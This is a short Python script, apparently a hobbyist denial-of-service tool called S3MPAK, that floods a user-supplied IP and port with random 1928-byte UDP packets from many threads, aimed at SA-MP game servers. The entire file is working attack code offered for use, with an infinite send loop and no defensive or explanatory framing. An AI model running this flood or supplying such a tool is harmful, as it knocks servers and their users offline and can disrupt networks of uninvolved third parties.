# SXMP - A UDP-Flood script that made on purpose.
# Launches a attack to the SAMP connection client.
import random
import socket
import threading
print("""
-------------------- S3MP4K --------------------        
                                               
    S3MPAK - DDoS Attacks - S3MPAK
    Author : T4M4M
""")

ip = str(input("> IP : "))
port = int(input("> PORT : "))
times = int(input("> Connection packets : "))
threads = int(input("> Packets : "))

# Attack
def sxmp():
	data = random._urandom(1928)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(f"SEMP4K >> Merasenggan {ip} Oraaa.... {port}")
		except:
			print(f"S3MP4K >> Merasenggan {ip} Oraaa.... {port}")

# Threads
for y in range(threads):
	th = threading.Thread(target = sxmp)
	th.start()
